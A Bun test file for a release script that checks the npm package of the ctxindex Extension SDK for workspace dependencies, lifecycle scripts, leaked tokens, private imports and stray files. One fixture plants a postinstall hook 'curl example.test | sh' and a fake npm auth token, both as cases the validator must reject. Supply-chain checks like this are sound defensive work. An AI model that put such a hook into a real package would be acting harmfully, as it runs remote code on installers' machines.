import { expect, test } from 'bun:test'
import {
  assertSafeExtensionSdkPackageFiles,
  createExtensionSdkPublishManifest,
  type ExtensionSdkSourceManifest,
} from '../../../scripts/release/extension-sdk-package'

const sourceManifest: ExtensionSdkSourceManifest = {
  name: '@ctxindex/extension-sdk',
  version: '0.1.0',
  description: 'Type-safe authoring SDK for ctxindex Extensions and Catalogs.',
  license: 'MIT',
  type: 'module',
  dependencies: { zod: '^4.4.3' },
}

test('creates the minimal public Extension SDK manifest', () => {
  expect(createExtensionSdkPublishManifest(sourceManifest)).toEqual({
    name: '@ctxindex/extension-sdk',
    version: '0.1.0',
    description: sourceManifest.description,
    license: 'MIT',
    homepage: 'https://ctxindex.com',
    bugs: { url: 'https://github.com/barisgit/ctxindex/issues' },
    type: 'module',
    exports: {
      '.': {
        types: './dist/index.d.ts',
        import: './dist/index.js',
      },
    },
    files: ['dist', 'README.md', 'LICENSE'],
    engines: { bun: '1.3.14' },
    repository: {
      type: 'git',
      url: 'git+https://github.com/barisgit/ctxindex.git',
      directory: 'packages/extension-sdk',
    },
    publishConfig: {
      access: 'public',
      registry: 'https://registry.npmjs.org/',
    },
    dependencies: { zod: '^4.4.3' },
  })
})

test('rejects workspace metadata, lifecycle scripts, secrets, and private imports', () => {
  const valid = [
    { path: 'package/LICENSE', content: 'MIT' },
    { path: 'package/README.md', content: '# SDK' },
    { path: 'package/dist/index.d.ts', content: "export { z } from 'zod'" },
    { path: 'package/dist/index.js', content: "export { z } from 'zod'" },
    {
      path: 'package/package.json',
      content: JSON.stringify(
        createExtensionSdkPublishManifest(sourceManifest),
      ),
    },
  ] as const

  expect(() => assertSafeExtensionSdkPackageFiles(valid)).not.toThrow()
  for (const [label, files] of [
    [
      'workspace dependency',
      valid.map((file) =>
        file.path === 'package/package.json'
          ? { ...file, content: file.content.replace('^4.4.3', 'workspace:*') }
          : file,
      ),
    ],
    [
      'lifecycle script',
      valid.map((file) =>
        file.path === 'package/package.json'
          ? {
              ...file,
              content: JSON.stringify({
                ...JSON.parse(file.content),
                scripts: { postinstall: 'curl example.test | sh' },
              }),
            }
          : file,
      ),
    ],
    [
      'secret',
      valid.map((file) =>
        file.path === 'package/README.md'
          ? { ...file, content: '//registry.npmjs.org/:_authToken=npm_secret' }
          : file,
      ),
    ],
    [
      'private import',
      valid.map((file) =>
        file.path === 'package/dist/index.js'
          ? { ...file, content: "import '@ctxindex/core'" }
          : file,
      ),
    ],
  ] as const) {
    expect(() => assertSafeExtensionSdkPackageFiles(files), label).toThrow()
  }
})

test('rejects undeclared or unexpected archive entries', () => {
  const manifest = JSON.stringify(
    createExtensionSdkPublishManifest(sourceManifest),
  )
  expect(() =>
    assertSafeExtensionSdkPackageFiles([
      { path: 'package/LICENSE', content: 'MIT' },
      { path: 'package/README.md', content: '# SDK' },
      { path: 'package/dist/index.d.ts', content: "export { z } from 'zod'" },
      { path: 'package/dist/index.js', content: "export { z } from 'zod'" },
      { path: 'package/package.json', content: manifest },
      { path: 'package/src/index.ts', content: 'source leak' },
    ]),
  ).toThrow('Unexpected Extension SDK package file')
})

test('requires ESM declaration specifiers with archived targets', () => {
  const manifest = JSON.stringify(
    createExtensionSdkPublishManifest(sourceManifest),
  )
  const files = [
    { path: 'package/LICENSE', content: 'MIT' },
    { path: 'package/README.md', content: '# SDK' },
    { path: 'package/dist/index.d.ts', content: "export * from './adapter'" },
    { path: 'package/dist/index.js', content: "export { z } from 'zod'" },
    { path: 'package/package.json', content: manifest },
  ] as const

  expect(() => assertSafeExtensionSdkPackageFiles(files)).toThrow(
    'non-ESM relative import',
  )
  expect(() =>
    assertSafeExtensionSdkPackageFiles(
      files.map((file) =>
        file.path === 'package/dist/index.d.ts'
          ? { ...file, content: "export * from './adapter.js'" }
          : file,
      ),
    ),
  ).toThrow('declaration import is missing')
  expect(() =>
    assertSafeExtensionSdkPackageFiles([
      ...files.map((file) =>
        file.path === 'package/dist/index.d.ts'
          ? { ...file, content: "export * from './adapter.js'" }
          : file,
      ),
      { path: 'package/dist/adapter.d.ts', content: 'export {}' },
    ]),
  ).not.toThrow()
})
